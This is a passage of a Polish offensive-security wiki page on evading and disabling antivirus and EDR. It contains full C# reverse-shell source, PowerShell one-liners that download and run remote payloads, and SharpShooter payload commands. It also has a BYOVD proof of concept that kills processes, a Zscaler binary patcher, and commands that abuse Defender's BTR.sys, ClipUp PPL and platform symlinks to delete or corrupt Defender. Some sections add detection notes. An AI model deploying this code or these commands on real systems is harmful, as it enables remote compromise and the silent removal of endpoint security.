// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
	public class Program
	{
		static StreamWriter streamWriter;

		public static void Main(string[] args)
		{
			using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
			{
				using(Stream stream = client.GetStream())
				{
					using(StreamReader rdr = new StreamReader(stream))
					{
						streamWriter = new StreamWriter(stream);

						StringBuilder strInput = new StringBuilder();

						Process p = new Process();
						p.StartInfo.FileName = "cmd.exe";
						p.StartInfo.CreateNoWindow = true;
						p.StartInfo.UseShellExecute = false;
						p.StartInfo.RedirectStandardOutput = true;
						p.StartInfo.RedirectStandardInput = true;
						p.StartInfo.RedirectStandardError = true;
						p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
						p.Start();
						p.BeginOutputReadLine();

						while(true)
						{
							strInput.Append(rdr.ReadLine());
							//strInput.Append("\n");
							p.StandardInput.WriteLine(strInput);
							strInput.Remove(0, strInput.Length);
						}
					}
				}
			}
		}

		private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception err) { }
            }
        }

	}
}
```

### C# z użyciem kompilatora

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```

[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Automatyczne pobieranie i uruchamianie:

```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```


{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Lista obfuscatorów C#: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++

```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```

- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](https://github.com/l0ss/Grouper2)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Przykład użycia Pythona do tworzenia injectorów:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Inne narzędzia

```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```

### Więcej

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Unieszkodliwianie AV/EDR z przestrzeni jądra

Storm-2603 wykorzystał niewielkie narzędzie konsolowe znane jako **Antivirus Terminator**, aby wyłączyć ochronę punktów końcowych przed wdrożeniem ransomware. Narzędzie dostarcza **własny podatny, ale *podpisany* sterownik** i nadużywa go do wykonywania uprzywilejowanych operacji w jądrze, których nie mogą zablokować nawet usługi AV działające w trybie Protected-Process-Light (PPL).<sup>[[12]](#references)</sup>

Najważniejsze wnioski
1. **Podpisany sterownik**: Plik zapisywany na dysku to `ServiceMouse.sys`, ale jest to oficjalnie podpisany sterownik `AToolsKrnl64.sys` z „System In-Depth Analysis Toolkit” firmy Antiy Labs. Ponieważ sterownik ma prawidłowy podpis Microsoftu, ładuje się nawet wtedy, gdy włączone jest wymuszanie podpisów sterowników (DSE).
2. **Instalacja usługi**:
   ```powershell
   sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
   sc start  ServiceMouse
   ```
   Pierwsza linia rejestruje sterownik jako **usługę jądra**, a druga go uruchamia, dzięki czemu `\\.\ServiceMouse` staje się dostępny z przestrzeni użytkownika.
3. **IOCTLs udostępniane przez sterownik**
   | Kod IOCTL | Możliwość                              |
   |-----------:|-----------------------------------------|
   | `0x99000050` | Zakończenie dowolnego procesu na podstawie PID (używane do zabijania usług Defender/EDR) |
   | `0x990000D0` | Usunięcie dowolnego pliku z dysku |
   | `0x990001D0` | Wyładowanie sterownika i usunięcie usługi |

   Minimalny proof-of-concept w C:
   ```c
   #include <windows.h>
   
   int main(int argc, char **argv){
       DWORD pid = strtoul(argv[1], NULL, 10);
       HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
       DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
       CloseHandle(hDrv);
       return 0;
   }
   ```
4. **Dlaczego to działa**: BYOVD całkowicie pomija zabezpieczenia w trybie użytkownika; kod wykonywany w jądrze może otwierać *chronione* procesy, kończyć je lub modyfikować obiekty jądra niezależnie od PPL/PP, ELAM czy innych funkcji utwardzania systemu.

Wykrywanie / ograniczanie ryzyka
• Włącz listę blokowanych podatnych sterowników Microsoftu (`HVCI`, `Smart App Control`), aby system Windows odmawiał załadowania `AToolsKrnl64.sys`.
• Monitoruj tworzenie nowych usług *jądra* i generuj alerty, gdy sterownik zostanie załadowany z katalogu, do którego każdy ma prawo zapisu, lub gdy nie znajduje się na liście dozwolonych.
• Obserwuj uchwyty z trybu użytkownika do niestandardowych obiektów urządzeń, po których następują podejrzane wywołania `DeviceIoControl`.

### Omijanie kontroli stanu urządzenia Zscaler Client Connector przez modyfikowanie binariów na dysku

**Client Connector** firmy Zscaler stosuje lokalnie reguły stanu urządzenia i korzysta z Windows RPC, aby przekazywać wyniki innym komponentom. Dwie słabe decyzje projektowe umożliwiają pełne obejście:

1. Ocena stanu urządzenia odbywa się **w całości po stronie klienta** (na serwer wysyłana jest wartość logiczna).
2. Wewnętrzne punkty końcowe RPC weryfikują jedynie, czy łączący się plik wykonywalny jest **podpisany przez Zscaler** (za pomocą `WinVerifyTrust`).<sup>[[11]](#references)</sup>

Przez **modyfikację czterech podpisanych binariów na dysku** można zneutralizować oba mechanizmy:

| Binarium | Zmodyfikowana oryginalna logika | Rezultat |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Zawsze zwraca `1`, więc każda kontrola kończy się zgodnością |
| `ZSAService.exe` | Pośrednie wywołanie `WinVerifyTrust` | Zastąpione instrukcjami NOP ⇒ dowolny proces (nawet niepodpisany) może połączyć się z potokami RPC |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Zastąpione przez `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Kontrole integralności tunelu | Pominięte |

Fragment minimalnego patchera:

```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
    data = f.read()
    off = data.find(pattern)
    if off == -1:
        print("pattern not found")
    else:
        f.seek(off)
        f.write(replacement)
```

Po zastąpieniu oryginalnych plików i ponownym uruchomieniu stosu usług:

* **Wszystkie** kontrole stanu zabezpieczeń wyświetlają stan **zielony/zgodny**.
* Niepodpisane lub zmodyfikowane pliki binarne mogą otwierać punkty końcowe RPC typu named pipe (np. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* Naruszony host uzyskuje nieograniczony dostęp do sieci wewnętrznej zdefiniowanej przez zasady Zscaler.

To studium przypadku pokazuje, jak kilka prostych poprawek bajtów może obejść decyzje dotyczące zaufania podejmowane wyłącznie po stronie klienta oraz proste kontrole podpisów.

## Nadużycie zaufanej funkcjonalności Microsoft Defender `BTR.sys`

Sterownik **Boot-Time Removal** w Defenderze stanowi użyteczny kontrprzykład dla klasycznego BYOVD. `BTR.sys` to legalny, podpisany przez Microsoft komponent naprawczy, który nie zawiera błędu korupcji pamięci ani interfejsu IOCTL; po uzyskaniu dostępu administratora i `SeLoadDriverPrivilege` operator może zamiast tego sfałszować prywatną transakcję naprawczą sterownika i uzyskać dostęp do zamierzonych operacji na plikach/rejestrze w Ring-0. Jest to **mechanizm neutralizacji AV/EDR po przejęciu systemu, a nie sposób uzyskania początkowego dostępu ani eskalacji uprawnień**. Sterownik można wyodrębnić z zasobu `BOOTTIMETOOL` w pliku `MpEngine.dll` na zaatakowanym systemie, zamiast importować rzucający się w oczy sterownik innej firmy.<sup>[[36]](#references)</sup>

### Przygotowanie sterownika jednorazowego

Defender zwykle zapisuje zasób w pliku o losowej nazwie `[a-z]{8}.sys` i rejestruje usługę jądra o podobnej nazwie. `DriverEntry` odczytuje wartość `Args` usługi, otwiera wskazany strumień ADS systemu plików NTFS, odszyfrowuje i weryfikuje listę akcji, zapisuje informację zwrotną, a po pomyślnym wykonaniu zwraca `0xC0000056` (`STATUS_DELETE_PENDING`), aby sterownik został wyładowany, zamiast pozostać załadowanym. Sfałszowana usługa ma następujące charakterystyczne wartości.<sup>[[36]](#references)[[37]](#references)</sup>

```text
Type         = 1
Start        = 1
ErrorControl = 0
ImagePath    = \??\C:\Windows\System32\drivers\<random>.sys
Group        = Boot Bus Extender
Args         = C:\Windows\System32\drivers\<random>.sys:changelist
```

Strumień `:changelist` zawiera jeden zaszyfrowany blob RC4. Analizowane kompilacje używają ponownie stałego klucza o długości 256 bajtów, więc szyfrowanie nie stanowi granicy autoryzacji. Prawidłowy tekst jawny zawiera 24-bajtowy nagłówek globalny (`Magic=0xFEE1DEAD`, `Version=2`, `PayloadOffset=0x10`, CRC nagłówka i identyfikator transakcji wyprowadzony z payloadu), po którym następują zakończona znakiem NUL ścieżka feedback w UTF-16 oraz dowolna liczba elementów. Każdy element zawiera 16-bajtowy nagłówek (`DataSize`, `Action`, `HeaderCRC`, `DataCRC`) oraz dane zależne od akcji, zakończone **dokładnie czterema bajtami NUL**. Każdy region nagłówka i danych jest sprawdzany niezależnie za pomocą CRC-32 z wielomianem `0xEDB88320`, stanem początkowym `0xFFFFFFFF` i **bez końcowego XOR** (`~CRC32`); stan CRC jest resetowany dla każdego regionu.<sup>[[36]](#references)[[37]](#references)</sup>

Akceptowane identyfikatory akcji udostępniają następujące prymitywy jądra.<sup>[[36]](#references)[[37]](#references)</sup>

| ID | Dane elementu | Rezultat |
| --- | --- | --- |
| 1 | `[ścieżka UTF-16]` | Usunięcie pliku, również zablokowanego |
| 2 | `[ścieżka UTF-16]` | Usunięcie pustego katalogu |
| 3 | `[Flagi][źródło][cel]` | Przeniesienie pliku do wybranej przez atakującego chronionej ścieżki; pusty cel oznacza usunięcie |
| 4 | `[Flagi][ścieżka klucza]` | Rekurencyjne usunięcie klucza rejestru |
| 5 | `[Flagi][ścieżka klucza + "\\" + wartość]` | Usunięcie wartości rejestru |
| 6 | `[Flagi][typ][rozmiar][ścieżka klucza + "\\" + wartość][dane]` | Utworzenie lub aktualizacja wartości rejestru oraz utworzenie brakujących ścieżek kluczy |

W przypadku akcji 5 i 6 separator klucza/wartości w danych przesyłanych **składa się z dwóch kolejnych ukośników odwrotnych**; ścieżka zapisana w standardowym formacie nie zostanie prawidłowo podzielona. Plik feedback w większości odzwierciedla żądanie, ale pierwsze cztery bajty danych każdego elementu są zastępowane jego wynikowym `NTSTATUS`. W przypadku akcji 1 i 2, które nie mają początkowego pola flags, BTR przesuwa ścieżkę do czterech zarezerwowanych bajtów na końcu, aby zrobić miejsce na ten status.<sup>[[36]](#references)</sup>

### Przepływ pracy `BTR_CLI` i okno wczesnego rozruchu

[`BTR_CLI`](https://github.com/Dump-GUY/BTR_CLI) realizuje cały łańcuch: wyodrębnia `BTR.sys` z lokalnej instalacji Defendera, tworzy `<random>.sys:changelist` i strumień feedback, serializuje, oblicza sumy kontrolne i szyfruje łańcuch akcji, bezpośrednio tworzy klucz rejestru usługi, a następnie wywołuje `NtLoadDriver` dla `-trigger now` albo pozostawia sterownik jako uruchamiany przy starcie systemu dla `-trigger boot`. Bezpośrednie przygotowanie wpisów w rejestrze omija standardową ścieżkę SCM `CreateServiceW`, dlatego **nie generuje** zdarzenia instalacji usługi o identyfikatorze 7045. Artefakty uruchamiane podczas rozruchu można później usunąć za pomocą `BTR_CLI.exe -cleanup <service_name>`.<sup>[[36]](#references)[[37]](#references)</sup>

```powershell
# Runtime: remove protected security-service registrations from Ring 0
BTR_CLI.exe -chain -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WdFilter" -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WinDefend" -trigger now

# Boot: delete a security driver before its user-mode protection stack starts
BTR_CLI.exe -a 1 -s "C:\Windows\System32\drivers\wd\WdFilter.sys" -trigger boot
```

`Start=0` nie nadaje się do użycia, ponieważ BTR wykonuje operacje wejścia/wyjścia na plikach z poziomu `DriverEntry`, zanim stos pamięci masowej i link `SystemRoot` będą gotowe. `Start=1` w połączeniu z grupą o wysokim priorytecie `Boot Bus Extender` powoduje uruchomienie w fazie 1: można już korzystać z NTFS, ale wiele sterowników zabezpieczeń uruchamianych przy starcie systemu oraz usług EDR w trybie użytkownika nie zostało jeszcze zainicjowanych. Filtry uruchamiane podczas rozruchu, takie jak `WdFilter`, mogą być już załadowane, ale BTR może usunąć ich pliki binarne lub konfigurację usług przed następnym uruchomieniem, a także usunąć pliki wykonywalne usług, zanim uruchomi je SCM. ELAM nie eliminuje tej luki, ponieważ BTR działa po ocenie sterowników uruchamianych podczas rozruchu i ma ważny podpis Microsoft.<sup>[[36]](#references)</sup>

Wiele działań jest wykonywanych w ramach jednej transakcji. PoC dodaje przed innymi działanie 1 dotyczące zakodowanego na sztywno pliku `\SystemRoot\Temp\BootClean.log`: BTR tworzy ten dziennik, następnie realizuje własne żądanie usunięcia i usuwa go przed wyładowaniem. Ogranicza to ilość pozostawionych śladów, a zapisanie informacji zwrotnej w `<random>.sys:<random>.dat` pozwala usunąć sterownik i oba strumienie jednocześnie.<sup>[[36]](#references)[[37]](#references)</sup>

### Korelacje o wysokiej wartości sygnału

Reguły oparte wyłącznie na podpisach oraz lista blokowanych podatnych sterowników Microsoftu nie chronią przed nadużywaniem zamierzonych funkcji BTR. Preferuj poniższe korelacje behawioralne, odróżniając przy tym legalne pochodzenie z Defendera od dowolnego programu uruchamiającego.<sup>[[36]](#references)</sup>

- **Sysmon 15:** utworzenie `.sys:changelist` występuje zawsze podczas przygotowywania BTR. Strumień ADS `.dat` dołączony do tego samego pliku `.sys` jest szczególnie podejrzany, ponieważ Defender zwykle umieszcza informacje zwrotne w `C:\ProgramData\Microsoft\Windows Defender\Scans\RebootActions\`.
- **Sysmon 12/13 bez System 7045:** koreluj bezpośrednie utworzenie `HKLM\SYSTEM\CurrentControlSet\Services\<random>` zawierającego `Args=...:changelist` i `Group=Boot Bus Extender` z brakiem odpowiadającego mu zdarzenia instalacji SCM.
- **Sysmon 6 -> 23:** koreluj załadowanie znanego sterownika BTR, pochodzącego spoza łańcucha procesów Defendera, z późniejszym usunięciem pliku przypisanym do `System`/PID 4, szczególnie gdy chodzi o pliki binarne związane z bezpieczeństwem.
- **Sysmon 11 -> 23:** zgłaszaj alert, gdy `System`/PID 4 szybko tworzy, a następnie usuwa `\SystemRoot\Temp\BootClean.log`.
- Ograniczaj i audytuj nadawanie/włączanie uprawnienia `SeLoadDriverPrivilege`; sam podpis Microsoftu nie gwarantuje zaufania, gdy sterownik narzędzia zabezpieczającego jest przygotowywany przez `cmd.exe`, PowerShell lub nieznany proces.

## Nadużywanie Protected Process Light (PPL) do modyfikowania AV/EDR za pomocą LOLBIN-ów

Protected Process Light (PPL) wymusza hierarchię poziomów i podpisów, dzięki czemu procesy chronione mogą wzajemnie ingerować w siebie tylko wtedy, gdy mają równy lub wyższy poziom ochrony. Z perspektywy ofensywnej, jeśli możesz legalnie uruchomić plik binarny obsługujący PPL i kontrolować jego argumenty, możesz wykorzystać nieszkodliwą funkcjonalność (np. logowanie) jako ograniczony mechanizm zapisu wspierany przez PPL, działający na chronione katalogi używane przez AV/EDR.<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)[[20]](#references)</sup>

Co sprawia, że proces działa jako PPL
- Docelowy plik EXE (oraz wszystkie załadowane biblioteki DLL) musi być podpisany certyfikatem z EKU obsługującym PPL.
- Proces musi zostać utworzony za pomocą CreateProcess z flagami: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- Należy zażądać zgodnego poziomu ochrony, odpowiadającego podpisowi pliku binarnego (np. `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` dla podpisów antymalware, `PROTECTION_LEVEL_WINDOWS` dla podpisów Windows). Nieprawidłowe poziomy spowodują niepowodzenie podczas tworzenia procesu.

Zobacz także szersze wprowadzenie do PP/PPL i ochrony LSASS:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Narzędzia do uruchamiania
- Pomocnicze narzędzie open source: CreateProcessAsPPL (wybiera poziom ochrony i przekazuje argumenty do docelowego pliku EXE):
  - [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)<sup>[[19]](#references)</sup>
- Wzorzec użycia:

```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```

LOLBIN primitive: ClipUp.exe
- Podpisany plik binarny systemu `C:\Windows\System32\ClipUp.exe` uruchamia własny proces potomny i przyjmuje parametr wskazujący ścieżkę, pod którą ma zapisać plik dziennika.
- Po uruchomieniu jako proces PPL zapis pliku odbywa się z uprawnieniami PPL.
- ClipUp nie obsługuje ścieżek zawierających spacje; użyj krótkich ścieżek 8.3, aby wskazać zwykle chronione lokalizacje.

Narzędzia do krótkich ścieżek 8.3
- Wyświetlanie krótkich nazw: uruchom `dir /x` w każdym katalogu nadrzędnym.
- Wyznaczanie krótkiej ścieżki w cmd: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Łańcuch nadużycia (w zarysie)
1) Uruchom LOLBIN obsługujący PPL (ClipUp) z flagą `CREATE_PROTECTED_PROCESS`, używając programu uruchamiającego (np. CreateProcessAsPPL).
2) Przekaż argument ścieżki pliku dziennika ClipUp, aby wymusić utworzenie pliku w chronionym katalogu AV (np. Defender Platform). W razie potrzeby użyj krótkich nazw 8.3.
3) Jeśli plik docelowy jest zwykle otwarty/zablokowany przez AV podczas działania (np. MsMpEng.exe), zaplanuj zapis podczas rozruchu, zanim uruchomi się AV, instalując usługę autostartową, która z pewnością uruchomi się wcześniej. Sprawdź kolejność uruchamiania za pomocą Process Monitor (rejestrowanie rozruchu).
4) Po ponownym uruchomieniu zapis z uprawnieniami PPL następuje przed zablokowaniem plików binarnych przez AV, uszkadzając plik docelowy i uniemożliwiając uruchomienie.

Przykładowe wywołanie (ścieżki ukryto/skrócono ze względów bezpieczeństwa):

```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```

Uwagi i ograniczenia
- Nie można kontrolować zawartości zapisywanej przez ClipUp — można określić jedynie jej lokalizację. Ta prymitywna technika nadaje się do uszkadzania, a nie do precyzyjnego wstrzykiwania zawartości.
- Do zainstalowania/uruchomienia usługi i zaplanowania ponownego uruchomienia systemu wymagane są lokalne uprawnienia administratora/SYSTEM.
- Kluczowe znaczenie ma czas: cel nie może być otwarty; uruchomienie podczas rozruchu pozwala uniknąć blokad plików.

Wykrywanie
- Utworzenie procesu `ClipUp.exe` z nietypowymi argumentami, zwłaszcza gdy jego procesem nadrzędnym jest niestandardowy program uruchamiający, w okolicy rozruchu systemu.
- Nowe usługi skonfigurowane do automatycznego uruchamiania podejrzanych plików binarnych, które konsekwentnie uruchamiają się przed Defender/AV. Zbadaj utworzenie/modyfikację usługi przed awariami uruchamiania Defendera.
- Monitorowanie integralności plików binarnych/katalogów Platform Defendera; nieoczekiwane tworzenie/modyfikowanie plików przez procesy z flagami protected-process.
- Telemetria ETW/EDR: szukaj procesów utworzonych z `CREATE_PROTECTED_PROCESS` i nietypowego użycia poziomów PPL przez pliki binarne inne niż AV.

Środki zaradcze
- WDAC/Code Integrity: ogranicz, które podpisane pliki binarne mogą działać jako PPL i w ramach których procesów nadrzędnych; blokuj wywołanie ClipUp poza uzasadnionymi kontekstami.
- Dobre praktyki dotyczące usług: ogranicz tworzenie/modyfikowanie usług uruchamianych automatycznie i monitoruj manipulowanie kolejnością ich uruchamiania.
- Upewnij się, że ochrona przed naruszeniem zabezpieczeń Defendera i ochrona wczesnego uruchamiania są włączone; badaj błędy uruchamiania wskazujące na uszkodzenie plików binarnych.
- Rozważ wyłączenie generowania krótkich nazw 8.3 na woluminach zawierających narzędzia zabezpieczające, jeśli jest to zgodne ze środowiskiem (dokładnie przetestuj).

## Modyfikowanie Microsoft Defendera przez przejęcie dowiązania symbolicznego do folderu Platform Version

Windows Defender wybiera platformę, z której działa, wyliczając podfoldery w:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

Wybiera podfolder z najwyższym leksykograficznie ciągiem wersji (np. `4.18.25070.5-0`), a następnie uruchamia z niego procesy usługi Defendera (odpowiednio aktualizując ścieżki usługi/rejestru). Ten wybór ufa wpisom katalogu, w tym punktom ponownej analizy katalogów (dowiązaniom symbolicznym). Administrator może to wykorzystać, by przekierować Defendera do ścieżki zapisywalnej przez atakującego i doprowadzić do DLL sideloading lub zakłócenia działania usługi.<sup>[[21]](#references)[[22]](#references)</sup>

Wymagania wstępne
- Lokalny administrator (wymagany do tworzenia katalogów/dowiązań symbolicznych w folderze Platform)
- Możliwość ponownego uruchomienia systemu lub wywołania ponownego wyboru platformy Defendera (restart usługi podczas rozruchu)
- Wymagane są wyłącznie wbudowane narzędzia (`mklink`)

Dlaczego to działa
- Defender blokuje zapisy w swoich folderach, ale wybór platformy ufa wpisom katalogu i wybiera wersję o najwyższej kolejności leksykograficznej bez sprawdzania, czy ścieżka docelowa prowadzi do chronionej/zaufanej lokalizacji.

Krok po kroku (przykład)
1) Przygotuj zapisywalną kopię bieżącego folderu platformy, np. `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Utwórz wewnątrz Platform dowiązanie symboliczne katalogu o wyższej wersji, wskazujące na twój folder:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Wybór wyzwalacza (zalecane ponowne uruchomienie):
```cmd
shutdown /r /t 0
```
4) Zweryfikuj, czy MsMpEng.exe (WinDefend) jest uruchamiany ze ścieżki przekierowanej:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Należy sprawdzić nową ścieżkę procesu w `C:\TMP\AV\` oraz konfigurację usługi/rejestr odzwierciedlające tę lokalizację.

Opcje po uzyskaniu dostępu
- DLL sideloading/code execution: Upuść/zastąp biblioteki DLL ładowane przez Defendera z jego katalogu aplikacji, aby wykonać kod w procesach Defendera. Zobacz sekcję powyżej: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Zatrzymanie usługi/odmowa usługi: Usuń symlink wersji, aby przy następnym uruchomieniu skonfigurowana ścieżka nie została rozwiązana, a Defender nie mógł się uruchomić:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```

> [!TIP]
> Pamiętaj, że ta technika sama w sobie nie zapewnia eskalacji uprawnień; wymaga praw administratora.

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Zespoły red team mogą przenieść runtime evasion z implantu C2 do samego modułu docelowego, hookując jego Import Address Table (IAT) i kierując wybrane API przez kontrolowany przez atakującego kod niezależny od pozycji (PIC). Uogólnia to evasion poza niewielki zestaw API udostępnianych przez wiele kitów (np. CreateProcessA) i rozszerza te same zabezpieczenia na BOF-y oraz biblioteki DLL używane w post-exploitation.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>

Podejście z lotu ptaka
- Umieść blob PIC obok modułu docelowego za pomocą reflective loadera (dodany na początku lub jako plik towarzyszący). PIC musi być samowystarczalny i niezależny od pozycji.
- Podczas ładowania host DLL przejdź przez jego IMAGE_IMPORT_DESCRIPTOR i zmień wpisy IAT dla wybranych importów (np. CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc), aby wskazywały na proste wrappery PIC.
- Każdy wrapper PIC wykonuje evasion przed przekazaniem wywołania do właściwego adresu API. Typowe techniki evasion obejmują:
  - Maskowanie/odmaskowanie pamięci wokół wywołania (np. szyfrowanie obszarów beacon, zmiana RWX→RX, nazw lub uprawnień stron), a następnie przywrócenie stanu po wywołaniu.
  - Call-stack spoofing: utworzenie wiarygodnego stosu i przejście do docelowego API, tak aby analiza call stacka wskazywała oczekiwane ramki.<sup>[[9]](#references)</sup>
- Aby zapewnić zgodność, udostępnij interfejs, który pozwoli skryptowi Aggressor (lub odpowiednikowi) rejestrować API do hookowania dla Beacon, BOF-ów i bibliotek DLL używanych w post-exploitation.

Dlaczego tutaj IAT hooking
- Działa z dowolnym kodem korzystającym z hookowanego importu, bez modyfikowania kodu narzędzia i bez polegania na Beaconie, który miałby pośredniczyć w wybranych API.
- Obejmuje biblioteki DLL używane w post-exploitation: hookowanie LoadLibrary* pozwala przechwytywać ładowanie modułów (np. System.Management.Automation.dll, clr.dll) i stosować do ich wywołań API te same techniki maskowania i call-stack evasion.
- Przywraca niezawodne działanie poleceń post-exploitation tworzących procesy w przypadku detekcji opartych na call stacku, dzięki wrapperom CreateProcessA/W.

Minimalny szkic hooka IAT (pseudokod x64 C/C++)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Notatki
